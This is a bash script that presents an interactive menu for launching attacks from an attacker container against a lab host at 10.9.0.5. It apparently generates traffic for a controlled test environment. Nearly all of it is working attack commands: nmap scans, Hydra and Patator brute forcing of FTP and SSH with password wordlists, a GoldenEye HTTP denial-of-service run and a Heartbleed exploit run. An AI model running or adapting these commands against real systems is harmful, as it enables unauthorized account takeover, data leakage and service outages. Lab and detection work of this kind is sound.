#!/bin/bash

# Interactive Attack Demonstration Menu
# Run this inside the attacker container

TARGET="10.9.0.5"
WORDLIST_PASS="/volumes/xato_passwords_100k.txt"
WORDLIST_USER="/volumes/common_usernames.txt"

# Colors for better visibility
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Flag to track if we're in "all" mode
ALL_MODE=false

# Trap Ctrl+C to allow aborting current attack
trap 'handle_interrupt' INT

handle_interrupt() {
    echo -e "\n${YELLOW}[!] Attack interrupted by user${NC}"
    if [ "$ALL_MODE" = true ]; then
        echo -e "${YELLOW}[?] Continue to next attack? (y/n)${NC}"
        read -r continue_choice
        if [[ ! "$continue_choice" =~ ^[Yy]$ ]]; then
            echo -e "${RED}Aborting all attacks...${NC}"
            ALL_MODE=false
            return 1
        fi
    fi
    return 0
}

clear

echo -e "${GREEN}=====================================${NC}"
echo -e "${GREEN}   Attack Demonstration Menu${NC}"
echo -e "${GREEN}=====================================${NC}"
echo -e "Target: ${YELLOW}$TARGET${NC}"
echo ""
echo -e "${BLUE}💡 Tip: Press Ctrl+C to abort current attack${NC}"
echo ""

show_menu() {
    echo -e "${BLUE}Available Attacks:${NC}"
    echo ""
    echo "  1) portscan-basic - Basic nmap scan"
    echo "  2) portscan-syn   - SYN scan with sudo"
    echo "  3) portscan-full  - Full scan with scripts"
    echo "  4) portscan-stealth - Stealth scan (ignore ping)"
    echo ""
    echo "  5) ftp-hydra      - FTP brute force using Hydra"
    echo "  6) [WIP] ftp-patator    - FTP brute force using Patator"
    echo "  7) ftp-brute      - Both FTP brute force tools"
    echo ""
    echo "  8) ssh-hydra      - SSH brute force using Hydra"
    echo "  9) [WIP]ssh-patator    - SSH brute force using Patator"
    echo " 10) ssh-brute      - Both SSH brute force tools"
    echo ""
    echo " 11) dos-http       - HTTP DOS attack (GoldenEye)"
    echo " 12) heartbleed     - Heartbleed SSL attack"
    echo ""
    echo " 13) all            - Run ALL attacks (10s max each)"
    echo ""
    echo "  q) quit           - Exit menu"
    echo ""
    echo -e "${YELLOW}Enter command:${NC} "
}

run_portscan_basic() {
    echo -e "${GREEN}[*] Running Basic Port Scan...${NC}"
    if [ "$ALL_MODE" = true ]; then
        timeout 10 nmap -A -p- $TARGET 2>&1 || echo -e "${YELLOW}[⏱] Timeout reached (10s)${NC}"
    else
        nmap -A -p- $TARGET
    fi
    echo -e "${GREEN}[✓] Basic scan complete${NC}"
}

run_portscan_syn() {
    echo -e "${GREEN}[*] Running SYN Scan with raw packets...${NC}"
    if [ "$ALL_MODE" = true ]; then
        timeout 10 nmap -A -p- $TARGET 2>&1 || echo -e "${YELLOW}[⏱] Timeout reached (10s)${NC}"
    else
        nmap -A -p- $TARGET
    fi
    echo -e "${GREEN}[✓] SYN scan complete${NC}"
}

run_portscan_full() {
    echo -e "${GREEN}[*] Running Full Scan with scripts and version detection...${NC}"
    if [ "$ALL_MODE" = true ]; then
        timeout 10 nmap -A -p- -sC -sV $TARGET --min-rate 1000 2>&1 || echo -e "${YELLOW}[⏱] Timeout reached (10s)${NC}"
    else
        nmap -A -p- -sC -sV $TARGET --min-rate 1000
    fi
    echo -e "${GREEN}[✓] Full scan complete${NC}"
}

run_portscan_stealth() {
    echo -e "${GREEN}[*] Running Stealth Scan (ignoring ping)...${NC}"
    if [ "$ALL_MODE" = true ]; then
        timeout 10 nmap -A -p- -sC -sV $TARGET --min-rate 1000 -Pn 2>&1 || echo -e "${YELLOW}[⏱] Timeout reached (10s)${NC}"
    else
        nmap -A -p- -sC -sV $TARGET --min-rate 1000 -Pn
    fi
    echo -e "${GREEN}[✓] Stealth scan complete${NC}"
}

run_all_portscans() {
    echo -e "${YELLOW}Running all 4 port scan variations...${NC}"
    run_portscan_basic || return 1
    if [ "$ALL_MODE" = true ]; then sleep 2; else sleep 5; fi
    run_portscan_syn || return 1
    if [ "$ALL_MODE" = true ]; then sleep 2; else sleep 5; fi
    run_portscan_full || return 1
    if [ "$ALL_MODE" = true ]; then sleep 2; else sleep 5; fi
    run_portscan_stealth || return 1
}

run_ftp_hydra() {
    echo -e "${GREEN}[*] Running FTP Brute Force with Hydra...${NC}"
    if [ ! -f "$WORDLIST_PASS" ] || [ ! -f "$WORDLIST_USER" ]; then
        echo -e "${RED}[!] Wordlist files not found in /volumes/${NC}"
        return
    fi
    if [ "$ALL_MODE" = true ]; then
        timeout 10 hydra -P $WORDLIST_PASS -L $WORDLIST_USER ftp://$TARGET 2>&1 || echo -e "${YELLOW}[⏱] Timeout reached (10s)${NC}"
    else
        hydra -P $WORDLIST_PASS -L $WORDLIST_USER ftp://$TARGET
    fi
    echo -e "${GREEN}[✓] Hydra FTP brute force complete${NC}"
}

run_ftp_patator() {
    echo -e "${GREEN}[*] Running FTP Brute Force with Patator...${NC}"
    if [ ! -f "$WORDLIST_PASS" ] || [ ! -f "$WORDLIST_USER" ]; then
        echo -e "${RED}[!] Wordlist files not found in /volumes/${NC}"
        return
    fi
    if [ "$ALL_MODE" = true ]; then
        timeout 10 patator ftp_login host=$TARGET user=FILE1 password=FILE0 0=$WORDLIST_PASS 1=$WORDLIST_USER -x ignore:mesg='Authentication failed' 2>&1 || echo -e "${YELLOW}[⏱] Timeout reached (10s)${NC}"
    else
        patator ftp_login host=$TARGET user=FILE1 password=FILE0 0=$WORDLIST_PASS 1=$WORDLIST_USER -x ignore:mesg='Authentication failed'
    fi
    echo -e "${GREEN}[✓] Patator FTP brute force complete${NC}"
}

run_ssh_hydra() {
    echo -e "${GREEN}[*] Running SSH Brute Force with Hydra...${NC}"
    if [ ! -f "$WORDLIST_PASS" ] || [ ! -f "$WORDLIST_USER" ]; then
        echo -e "${RED}[!] Wordlist files not found in /volumes/${NC}"
        return
    fi
    if [ "$ALL_MODE" = true ]; then
        timeout 10 hydra -P $WORDLIST_PASS -L $WORDLIST_USER ssh://$TARGET 2>&1 || echo -e "${YELLOW}[⏱] Timeout reached (10s)${NC}"
    else
        hydra -P $WORDLIST_PASS -L $WORDLIST_USER ssh://$TARGET
    fi
    echo -e "${GREEN}[✓] Hydra SSH brute force complete${NC}"
}

run_ssh_patator() {
    echo -e "${GREEN}[*] Running SSH Brute Force with Patator...${NC}"
    if [ ! -f "$WORDLIST_PASS" ] || [ ! -f "$WORDLIST_USER" ]; then
        echo -e "${RED}[!] Wordlist files not found in /volumes/${NC}"
        return
    fi
    if [ "$ALL_MODE" = true ]; then
        timeout 10 patator ssh_login host=$TARGET user=FILE1 password=FILE0 0=$WORDLIST_PASS 1=$WORDLIST_USER -x ignore:mesg='Authentication failed' 2>&1 || echo -e "${YELLOW}[⏱] Timeout reached (10s)${NC}"
    else
        patator ssh_login host=$TARGET user=FILE1 password=FILE0 0=$WORDLIST_PASS 1=$WORDLIST_USER -x ignore:mesg='Authentication failed'
    fi
    echo -e "${GREEN}[✓] Patator SSH brute force complete${NC}"
}

run_dos_http() {
    echo -e "${GREEN}[*] Running HTTP DOS Attack (GoldenEye)...${NC}"
    if [ ! -f /volumes/GoldenEye/goldeneye.py ]; then
        echo -e "${RED}[!] GoldenEye script not found at /volumes/GoldenEye/goldeneye.py${NC}"
        return
    fi
    if [ "$ALL_MODE" = true ]; then
        timeout 10 python3 /volumes/GoldenEye/goldeneye.py http://$TARGET:80 2>&1 || echo -e "${YELLOW}[⏱] Timeout reached (10s)${NC}"
    else
        python3 /volumes/GoldenEye/goldeneye.py http://$TARGET:80
    fi
    echo -e "${GREEN}[✓] HTTP DOS attack complete${NC}"
}

run_heartbleed() {
    echo -e "${GREEN}[*] Running Heartbleed Attack...${NC}"
    if [ ! -f /volumes/Heartbleed/heartbleed.py ]; then
        echo -e "${RED}[!] Heartbleed script not found at /volumes/Heartbleed/heartbleed.py${NC}"
        return
    fi
    if [ "$ALL_MODE" = true ]; then
        timeout 10 python3 /volumes/Heartbleed/heartbleed.py https://$TARGET:443 2>&1 || echo -e "${YELLOW}[⏱] Timeout reached (10s)${NC}"
    else
        python3 /volumes/Heartbleed/heartbleed.py https://$TARGET:443
    fi
    echo -e "${GREEN}[✓] Heartbleed attack complete${NC}"
}

run_all_attacks() {
    ALL_MODE=true
    echo -e "${YELLOW}======================================${NC}"
    echo -e "${YELLOW}Running ALL attacks sequentially${NC}"
    echo -e "${YELLOW}Each attack limited to 10 seconds${NC}"
    echo -e "${YELLOW}Press Ctrl+C to skip current attack${NC}"
    echo -e "${YELLOW}======================================${NC}"
    echo ""
    
    echo -e "${BLUE}[1/10] Port Scanning (Basic)${NC}"
    run_portscan_basic || { ALL_MODE=false; return; }
    sleep 2
    
    echo -e "${BLUE}[2/10] Port Scanning (SYN)${NC}"
    run_portscan_syn || { ALL_MODE=false; return; }
    sleep 2
    
    echo -e "${BLUE}[3/10] Port Scanning (Full)${NC}"
    run_portscan_full || { ALL_MODE=false; return; }
    sleep 2
    
    echo -e "${BLUE}[4/10] Port Scanning (Stealth)${NC}"
    run_portscan_stealth || { ALL_MODE=false; return; }
    sleep 2
    
    echo -e "${BLUE}[5/10] FTP Brute Force (Hydra)${NC}"
    run_ftp_hydra || { ALL_MODE=false; return; }
    sleep 2
    
    echo -e "${BLUE}[6/10] FTP Brute Force (Patator)${NC}"
    run_ftp_patator || { ALL_MODE=false; return; }
    sleep 2
    
    echo -e "${BLUE}[7/10] SSH Brute Force (Hydra)${NC}"
    run_ssh_hydra || { ALL_MODE=false; return; }
    sleep 2
    
    echo -e "${BLUE}[8/10] SSH Brute Force (Patator)${NC}"
    run_ssh_patator || { ALL_MODE=false; return; }
    sleep 2
    
    echo -e "${BLUE}[9/10] HTTP DOS Attack${NC}"
    run_dos_http || { ALL_MODE=false; return; }
    sleep 2
    
    echo -e "${BLUE}[10/10] Heartbleed Attack${NC}"
    run_heartbleed || { ALL_MODE=false; return; }
    
    ALL_MODE=false
    echo ""
    echo -e "${GREEN}======================================${NC}"
    echo -e "${GREEN}All attacks completed!${NC}"
    echo -e "${GREEN}Total time: ~2 minutes${NC}"
    echo -e "${GREEN}======================================${NC}"
}

# Main loop
while true; do
    show_menu
    read -r choice
    
    case $choice in
        1) run_portscan_basic ;;
        2) run_portscan_syn ;;
        3) run_portscan_full ;;
        4) run_portscan_stealth ;;
        5) run_ftp_hydra ;;
        6) run_ftp_patator ;;
        7) run_ftp_hydra; sleep 5; run_ftp_patator ;;
        8) run_ssh_hydra ;;
        9) run_ssh_patator ;;
        10) run_ssh_hydra; sleep 5; run_ssh_patator ;;
        11) run_dos_http ;;
        12) run_heartbleed ;;
        13) run_all_attacks ;;
        q|Q) echo -e "${GREEN}Exiting...${NC}"; exit 0 ;;
        *) echo -e "${RED}Invalid option. Please try again.${NC}" ;;
    esac
    
    echo ""
    echo -e "${YELLOW}Press Enter to continue...${NC}"
    read
    clear
done